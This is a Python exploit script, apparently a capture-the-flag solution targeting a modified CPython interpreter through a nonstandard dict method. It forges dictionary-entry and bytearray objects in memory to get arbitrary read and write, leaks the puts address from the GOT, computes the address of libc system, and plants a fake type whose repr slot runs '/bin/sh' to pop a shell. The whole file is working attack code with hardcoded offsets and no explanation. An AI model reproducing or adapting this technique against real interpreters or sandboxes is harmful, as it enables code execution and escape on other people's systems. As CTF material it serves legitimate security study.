def pack(val):
    return bytes([i for i in ((val >> j * 8) & 0xff for j in range(8))])

buf = {
        0xdeadbeef: 123,
        0: 123,
        1: 123,
        2: 123,
        3: 123,
        4: 123,
        5: 123,
        6: 123,
}

victim_dict = {
        0x24: 123,
        0: 123,
        1: 123,
        2: 123,
        3: 123,
        4: 123,
        5: 123,
        6: 123,
}

buf1 = b"asdf"
buf1 += b"\x00" * (0xf0 - len(buf1))

print(f"{hex(id(buf1)) = }")
bytearray_addr = id(buf1) + 0x280
fakeobj_prim = [
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
]
print(f"{hex(id(fakeobj_prim)) = }")
target_addr = bytearray_addr - 0x160

# fake PyDictKeysEntry
fake_stuff = b"a"*0x8
fake_stuff += pack(0x8)
fake_stuff += pack(id(0x8))
fake_stuff += pack(bytearray_addr)

# fake bytearray for writing
fake_stuff += pack(0x100)
fake_stuff += pack(id(bytearray))
fake_stuff += pack(0x1000)
fake_stuff += pack(0x1000)
fake_stuff += pack(target_addr)
fake_stuff += pack(target_addr)

# padding
fake_stuff += b"\x00" * (0xf0 - len(fake_stuff))

assert victim_dict.grey() is True

print(f"{hex(id(victim_dict)) = }")
print(f"{hex(id(fake_stuff)) = }")

# fake bytearray created at index 8
write_gadget = memoryview(victim_dict[8])
print(write_gadget)

# create another fake bytearray for reading
puts_got_addr = id(1) - 0xf97f8
print(f"{hex(puts_got_addr) = }")
more_fake_stuff = pack(0x100)
more_fake_stuff += pack(id(bytearray))
more_fake_stuff += pack(0x1000)
more_fake_stuff += pack(0x1000)
more_fake_stuff += pack(puts_got_addr)
more_fake_stuff += pack(puts_got_addr)

write_gadget[0x00:0x08] = pack(id(more_fake_stuff)+0x20)

# get system addr
puts = int.from_bytes(fakeobj_prim[0][0:8], byteorder="little")
system = puts - 0x325e0
print(f"{hex(system) = }")

# fake type to get rip control via reprfunc
faker_stuff = pack(0x100)
faker_stuff += pack(id(type))
faker_stuff += b"a"*0x48
faker_stuff += pack(system)

fake_type_addr = id(faker_stuff)+0x20

# fake struct to use fake type
arg = b".bin/sh\x00" # this is refcount so the value will be incremented once
# fake struct
more_faker_stuff = arg
more_faker_stuff += pack(fake_type_addr)

print(f"{hex(id(more_faker_stuff))}")

write_gadget[0x08:0x10] = pack(id(more_faker_stuff)+0x20)

input("gdb..")

# pop shell!
repr(fakeobj_prim[1])
